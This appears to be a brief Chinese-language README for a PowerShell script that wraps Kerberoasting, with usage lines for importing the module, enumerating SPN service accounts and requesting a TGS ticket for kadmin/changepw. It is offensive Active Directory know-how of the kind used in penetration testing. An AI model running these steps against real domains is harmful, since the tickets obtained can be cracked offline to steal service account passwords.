# Kerberos.ps1

该脚本是简单封装的Kerberostring利用脚本，即获取SPN服务账户和获取请求票据的操作

```
Import-Module .\kerberos.ps1
```

```
# 获取SPN服务账户
Frail-Spns
# 请求服务票据TGS
Inject-Ticket kadmin/changepw

```




